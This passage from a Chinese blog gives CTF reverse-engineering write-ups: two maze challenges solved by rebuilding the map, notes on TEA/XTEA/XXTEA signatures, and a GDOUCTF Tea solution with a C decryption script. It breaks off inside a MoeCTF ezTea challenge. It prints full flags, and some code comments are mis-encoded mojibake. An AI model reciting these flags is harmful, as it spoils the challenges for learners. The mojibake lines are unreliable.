src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGJkNDc1NmMzMTFlOWM2YjZmMzg5Nzg3MmNmOTZiZWNfUFJCazVDdFFNZTgxZG9iVThSZTI0SlYwS2FFZ1VYRlVfVG9rZW46SzJjYWJ6RVozbzdBZUR4dFlEVmNsM1FwblNlXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OGJjY2VjN2RjMDkwNmEzMGE2NmMyMzUwZGE1ZDE1ZmFfbXBQaGhoQjhRUENDR3pmTXlxclZ6Y3M4MTgzalU2ZHpfVG9rZW46SzBpQ2JuUDE0b1ZLeG14RXEwSGNzdlRtbkhjXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>已知</p><ul><li>42 对应字符 <code>*</code>（星号）</li><li>35 对应字符 <code>#</code>（井号）</li></ul><p>所以这个迷宫以*为墙，#为终点，@为起点，flag是迷宫的路径</p><p>在主函数中</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQ5YTRmMWY1MDFkY2Y1MGZhMDk4ZGUwYzcyNWQwMGNfRG14SENZNlpqc25ObHc4WDMzb0RCYUZuSkhhNmFjVFNfVG9rZW46RW1HVmJtdUFCbzlGZFJ4SG1UbmN6dXBhbmNmXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>我们看到flag的长度 为24</p><p>我们现在已知迷宫的组成，可以利用脚本描绘出迷宫的样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[] = <span class="string">&quot;**************@************-************-***-**-*****--*****-*****-***#**-*****--**----******-*****-******-****--******---**-*******-*-----******-------*****************&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> rows = <span class="number">13</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> cols = <span class="number">13</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; rows; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; cols; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i*cols+j] == <span class="string">&#x27;-&#x27;</span>)       </span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-&quot;</span> &lt;&lt; <span class="string">&#x27; &#x27;</span>;      </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[i*cols+j] == <span class="string">&#x27;*&#x27;</span>) </span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="string">&#x27; &#x27;</span>;      </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; s[i*cols+j] &lt;&lt; <span class="string">&#x27; &#x27;</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzNlY2JkM2FjNWRmNTcwOGNkZWFiODA2YWJlY2Q1YjhfcFNSclpMVGFaamw3NFE1SGtHMFp4ZXVYR3BNdlFsak1fVG9rZW46VUtlUWJOZ0UzbzFZSXl4NVpJNGM0SGVKbm9mXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>我们也可以利用脚本得到路径</p><p>我们也可以把路径复制进入notepad中，是169个字符很显然，这是一个13*13的迷宫图</p><p>同样可以绘制出迷宫的样子，如上</p><p>根据路径，找到Flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sssssdsssddsdddwwdwwaaaw&#125;</span><br></pre></td></tr></table></figure><h1 id="2020华南师大CTF新生赛maze"><a href="#2020华南师大CTF新生赛maze" class="headerlink" title="2020华南师大CTF新生赛maze"></a>2020华南师大CTF新生赛maze</h1><p>依旧是先查壳</p><p>在ida中查看</p><p>先看一下主函数</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YzE1MWE4ZTdhN2NjYjVhM2ViNjg2ZjMzODk0YmM5MThfdVlqZHVWS0hWaFNJbjMwMEFYVUhMTm9SWkI2MmhsbGZfVG9rZW46UGJoUmJkeGZib215MEl4Y0RtZmNraXh0bkRwXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>这里的59是限制长度，flag的最短路径</p><p>再看一下里面的createmap函数</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzEwMTBjNTQ5YzM3OGI0NzI2NTgwY2QyZWY3ZjRmYmFfVmdvS2Z4eUt2RWxBMFJrSzhKeFNMNEZ0Yk9pVDVWVTBfVG9rZW46TW8xWGJ4d3hTb1REWm94M0NFd2NVYk85bnFXXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>在这个函数中，把num中的数最终转为二进制存储在map数组中，同时原本的16个字也变为了16*16&#x3D;256个字</p><p>所以这道题的迷宫是16*16的矩阵，现在，我们需要知道参与循环的v2的值，这里 运用动态调试</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDM1Yjk4MTE2ZDY3YmM4MGRmMzA0NTlkZWVjMTQxMjlfVW4yMm11ZGpRTTFlSkR0QWlVYkl1Z3NhcDNjMGFMZVVfVG9rZW46WDR0WGJuT1pVb0VXNFl4RUgyb2MwdDZWbjVnXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>运行十六次，最后在local页面获得十六进制字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num = [0xFFFF, 0x83F7, 0xBBF7, 0xBB17, 0xBB57, 0xB857, 0xBF57, 0xBF17, 0xBFB7, 0xBFB7, 0x8611, 0xF7B5, 0xF7B5, 0x7B4, 0xFF87, 0xFFFF]</span><br></pre></td></tr></table></figure><p>再结合check函数中，迷宫的正确走法，得到正确的地图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDVlMTJkNGJlNjA0Yjk1N2U1NWU5Y2U5ZGZjNjVlODNfYVQ5aUpESjQ5ZWxXS29XRXd0U0JEZjNGVElscXBZMEZfVG9rZW46UUNadWJxbUJ3b0owQjh4Q1JMaGMyakp6bnBoXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>函数中标注，正确的起点是[13,0]</p><p>这里需要我们自己根据函数生成迷宫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0b1111111111111111</span></span><br><span class="line"><span class="number">0b1000001111110111</span></span><br><span class="line"><span class="number">0b1011101111110111</span></span><br><span class="line"><span class="number">0b1011101100010111</span></span><br><span class="line"><span class="number">0b1011101101010111</span></span><br><span class="line"><span class="number">0b1011100001010111</span></span><br><span class="line"><span class="number">0b1011111101010111</span></span><br><span class="line"><span class="number">0b1011111100010111</span></span><br><span class="line"><span class="number">0b1011111110110111</span></span><br><span class="line"><span class="number">0b1011111110110111</span></span><br><span class="line"><span class="number">0b1000011000010001</span></span><br><span class="line"><span class="number">0b1111011110110101</span></span><br><span class="line"><span class="number">0b1111011110110101</span></span><br><span class="line"><span class="number">0b11110110100</span></span><br><span class="line"><span class="number">0b1111111110000111</span></span><br><span class="line"><span class="number">0b1111111111111111</span></span><br></pre></td></tr></table></figure><p>发现有空格，直接在最前面补0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0b1111111111111111</span></span><br><span class="line"><span class="number">0b1000001111110111</span></span><br><span class="line"><span class="number">0b1011101111110111</span></span><br><span class="line"><span class="number">0b1011101100010111</span></span><br><span class="line"><span class="number">0b1011101101010111</span></span><br><span class="line"><span class="number">0b1011100001010111</span></span><br><span class="line"><span class="number">0b1011111101010111</span></span><br><span class="line"><span class="number">0b1011111100010111</span></span><br><span class="line"><span class="number">0b1011111110110111</span></span><br><span class="line"><span class="number">0b1011111110110111</span></span><br><span class="line"><span class="number">0b1000011000010001</span></span><br><span class="line"><span class="number">0b1111011110110101</span></span><br><span class="line"><span class="number">0b1111011110110101</span></span><br><span class="line"><span class="number">0b0000011110110100</span></span><br><span class="line"><span class="number">0b1111111110000111</span></span><br><span class="line"><span class="number">0b1111111111111111</span></span><br></pre></td></tr></table></figure><p>找到最短路径</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MWE1ZmY2NjAwYzRmM2ZjNjY0ZTAxMDg5MWU1NmU0NDRfSEF2ZURDQ092ZVNDZkFiZGtsUlgyeWVDN1FYMUpHOVVfVG9rZW46TnZYVGJUNk1ib0pBWjB4R1NPZWNmeFNQbjBmXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>最后得到flag，在这道题目中，用ijkl表示</p><p><strong>flag{llllkkkhhhkkkkkkkkklllljjjjllljjljjjjjjjlllkkkklljjjl}</strong></p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week3-re-tea</title>
      <link href="/2025/04/28/week3-re-tea/"/>
      <url>/2025/04/28/week3-re-tea/</url>
      
        <content type="html"><![CDATA[<h1 id="算法特征"><a href="#算法特征" class="headerlink" title="算法特征"></a>算法特征</h1><h2 id="tea算法"><a href="#tea算法" class="headerlink" title="tea算法"></a>tea算法</h2><p>主要特征表现在sum和delta变量，以及三行核心加密中出现的右移4左移5，两行各有3个小括号相互异或。</p><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>密钥长度为128位</p><p>下面被拆分成4个子密钥<code>[K0,K1,K2,K3]</code></p><p>将64位明文分成两部分（假设为<code>L</code>，<code>R</code>，各32位）</p><p>进行64轮加密，更新<code>L</code>，<code>R</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">    L += ((R &lt;&lt; <span class="number">4</span>) + K0) ^ (R + sum) ^ ((R &gt;&gt; <span class="number">5</span>) + K1);</span><br><span class="line">    R += ((L &lt;&lt; <span class="number">4</span>) + K2) ^ (L + sum) ^ ((L &gt;&gt; <span class="number">5</span>) + K3);</span><br><span class="line">    sum += delta; <span class="comment">// delta = 0x9E3779B9（黄金比例相关）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>(R &lt;&lt; 4) + K0</code>：左移4位后叠加 <code>K0</code>。</li><li><code>(R &gt;&gt; 5) + K1</code>：右移5位后叠加 <code>K1</code>。</li></ul><p>sum初始值为0，每轮加密累加delta</p><h2 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h2><p>增多了密钥表，移位和异或等操作</p><h3 id="核心加密"><a href="#核心加密" class="headerlink" title="核心加密"></a>核心加密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L += ((R &lt;&lt; <span class="number">4</span> ^ R &gt;&gt; <span class="number">5</span>) + R) ^ (sum + K[sum &amp; <span class="number">3</span>]); <span class="comment">// 动态选择密钥</span></span><br><span class="line">sum += delta;</span><br><span class="line">R += ((L &lt;&lt; <span class="number">4</span> ^ L &gt;&gt; <span class="number">5</span>) + L) ^ (sum + K[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br></pre></td></tr></table></figure><h2 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h2><p>再难一点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v[j] += ((v[j<span class="number">-1</span>] &lt;&lt; <span class="number">4</span> ^ v[j<span class="number">-1</span>] &gt;&gt; <span class="number">5</span>) + v[j<span class="number">-1</span>]) ^ (sum + K[(j &amp; <span class="number">3</span>) ^ e]); <span class="comment">// 多块混合</span></span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="GDOUCTF-2023-Tea"><a href="#GDOUCTF-2023-Tea" class="headerlink" title="[GDOUCTF 2023]Tea"></a>[GDOUCTF 2023]Tea</h2><p>先查壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YzE2ZjgyNjNkZWM2MTdjOGI2ZGRhODcxNjU2MTA2OTFfdHR3VEUxOGg4TEhIZFYyRnlSVnA1ZWJkc0w0MTVKaGJfVG9rZW46QTA2dGJ5VXprb3BvbkZ4RWNSWmNXVVF2bllmXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>我们用ida打开后 利用shift+f12查找关键字，如下</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NGQ0ODE5YmVjNjQxNjIxOTFkZmJjNjk3MmI4NjAyOTlfYWFVdlduU2t4Zk53ZHBPQWU1YnYzZ3BGVUJudkJwM1NfVG9rZW46SzJJSGJnbDJTbzJFQXJ4YlR3YWNHN2sxblNkXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>我们看到了you are right，跟进（尝试），并查看 交叉引用（ctrl+x）</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjZlYzUxODQ4MjVhOGY5MDFiMzU5NmIxNTc1MzNiMzBfTk1hWUdGeTBKazF0RnlKb2hmaWJHR3VyQmRzMmNXQXBfVG9rZW46UDhmYWJOVXM5b0tEZzF4eXRYemNtYUE1bjhjXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>并按F5，进入</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzU3YTIwOTg2OTRhMDAzNzk2M2M0OTNiNDRhNWJhYjRfbHk3ODRtUUVobGp6ZllyU0RCcGhra3VNNnhEVEZMYzRfVG9rZW46Um5WUmJyMWVpb3h1STZ4NU54SmN5bGtCbkFiXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>我们点进去查看</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTM4ZDczMTdiMGNiZWVjZjA4MzZhZDU4NTFmMzUzNTJfTVV6YWJkc2UzaGlFUFlYYlU0OWhFdWVVSjl0ZVUxQTlfVG9rZW46TGlVemJ1cWtxb1BBc2t4T3V2MWNmZ05DbjZlXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmRjZmQ5Zjc4OWUwNWQwNDg1NTUzN2FlYWQzMzM1MzlfZkxCZVB1Vk1GSTRMVDdXcUlUMWc0OUMzSDNjZE9qdnJfVG9rZW46SnBYc2JwTVhsbzZxV3h4a3ZHRGNZSlo0bmp2XzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>这两个都是输入函数，将<code>v7</code>，<code>v8</code>分别输入，我们一个一个点进去看看</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTZkMDM3MzE1ZjJlNDYyYTYyYmU0YzAwM2QwMzdmZDRfOEhJdEdBclpKYkhTYkF4amlYcWdzUWJadloyZFc1T2lfVG9rZW46REpjMmJzTDdUb21xcE14cnYxT2NpNVI4bjFUXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><ul><li>原来的v7值为1234,5678,9012,3456</li><li>改变后的v7值为2233,4455,6677,8899</li></ul><p>在上面的sub_140011339中，a1就是最初的v7</p><p>在sub_140011352中</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGI5Yzg3NWUxNjFmMjdjY2YyNmQ1YjA2MjdiN2Q2YjZfVHlHR3NzYUJzbmlpNFJYQ0tBOThqQ2VXUkh3aGRraExfVG9rZW46Q2h2cGJOYjF5b2dkRG54dHdVMmNmZlFRbkFiXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>在这里，a1应该就对应的是flag，也就是v8，转换一下就是</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTIxZWIzODA0NzdmMzc0MmNmNTk0ZGYyYWE0ZGQxNGZfa2FTS09CR2FCOXo3UW91RndiZkZuRmFJS2JwMVE5eXlfVG9rZW46SkFremJKNWJlb1RGOUl4RmZwcWN4MGhIbm1nXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>进入下面的函数</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=N2FkNDAzN2I0NWZjMWFhNzVlOGYxMzYwOTM5YTQ1YTFfWEs2ejk0endNbGlGTlc3aWl2Y1JjOEdnOUl4SEszV0pfVG9rZW46Q0hnZmJySGRtbzNuSXd4S2ZMeGM0VzJwbnFCXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>里面是关键加密部分</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YzFmNDc3YzY1Zjc5NGI2ZDQ0MGI4NTUyYWM3N2Q4N2JfQnFPOEtVa3U4WUhrclA0ZkdMVFVPNTBMdFdvbVA3Y1pfVG9rZW46QVVmVWJSb3Bqb0dBOGp4dFVqRWNQVUQ4bjZiXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YjYyZThmMmU5NDRmNjRhYzk2OTMwNDM2NTk1MDdlNDJfaWM1RlhmV3ZoUkhGZGZPU3RJbkpLQ1Z5YmtkZnUxTDdfVG9rZW46UncwMGJPb2czb3RkQVF4dG01eWNGcWlNbnBmXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>这里就是Tea加密过程，其中的a2是原本的v7，也就是key值</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MmU2NTYwOThlMzgxN2UwMjg4ZWMxZDFiZjU0N2MwYzRfNnBNMjlGeEpIWmJHbUFtem9FblB5cjF6MkNRcWZSaldfVG9rZW46U3hRbGJOT2xlb2FXcGx4ejZPemNDYk5QbktoXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><p>我们进行改名，这道题差不多的逻辑就是这样</p><p>然后利用c语言对Tea加密过程进行逆写，形成一个解密脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0xF462900</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">2233</span>,<span class="number">4455</span>,<span class="number">6677</span>,<span class="number">8899</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> Data[<span class="number">10</span>] = &#123; <span class="number">0x1A800BDA</span> ,<span class="number">0xF7A6219B</span> ,<span class="number">0x491811D8</span>,<span class="number">0xF2013328</span>,<span class="number">0x156C365B</span>, <span class="number">0x3C6EAAD8</span>,<span class="number">0x84D4BF28</span>,<span class="number">0xF11A7EE7</span>,<span class="number">0x3313B252</span>,<span class="number">0xDD9FE279</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> j;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        j = <span class="number">33</span>;</span><br><span class="line">        sum = delta * (i + j);</span><br><span class="line">        <span class="keyword">while</span>(j--)</span><br><span class="line">        &#123; </span><br><span class="line">            sum -= delta;</span><br><span class="line">            Data[i + <span class="number">1</span>] -= (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ ((Data[i] + ((Data[i] &gt;&gt; <span class="number">5</span>) ^ (Data[i] &lt;&lt; <span class="number">4</span>))));</span><br><span class="line">            Data[i] -= sum ^ (Data[i + <span class="number">1</span>] + ((Data[i + <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) ^ (Data[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>))) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, Data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">485</span>a4354467b687a4374665f39345f726536363666696e676372793536343171717d0</span><br></pre></td></tr></table></figure><p>利用赛博厨子进行十六进制解码</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjM1NTc1ZmU1MGY2MDQ4OGJlMThiZDYzMGM0YTRlNjZfNnlJd2ExOWc3NUdvdndxc2RQMjNDZVVxOFhSUU05S2JfVG9rZW46R1BpbmJsQ0hDb0NrT3V4bnRyZmNuWG1abnJiXzE3NDU4NDQxNjg6MTc0NTg0Nzc2OF9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HZCTF&#123;hzCtf_94_re666fingcry5641qq&#125;</span><br></pre></td></tr></table></figure><h2 id="MoeCTF-2022-ezTea"><a href="#MoeCTF-2022-ezTea" class="headerlink" title="[MoeCTF 2022]ezTea"></a>[MoeCTF 2022]ezTea</h2><p>打开题目中的c语言代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;                       <span class="comment">// 涓昏鍔犲瘑鍑芥暟锛岃瘯鐫€鎼炲畾瀹?</span></span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xd33b470</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">int8_t</span> input[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%32s&quot;</span>, input);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i+=<span class="number">8</span>) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;*(<span class="type">uint32_t</span> *)&amp;input[i], *(<span class="type">uint32_t</span> *)&amp;input[i+<span class="number">4</span>]&#125;;</span><br><span class="line">        encrypt(v, k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;                           <span class="comment">// 杩欎竴娈典富瑕佹槸鎶?v 鎸夊崟瀛楄妭杈撳嚭锛屽彟澶栧彲浠ヤ簡瑙ｄ竴涓?鈥滃ぇ灏忕搴忊€?鍦ㄨ繖棰樻槸濡備綍浣撶幇鐨?</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%#x, &quot;</span>, v[j] &amp; <span class="number">0xff</span>);</span><br><span class="line">                v[j] &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 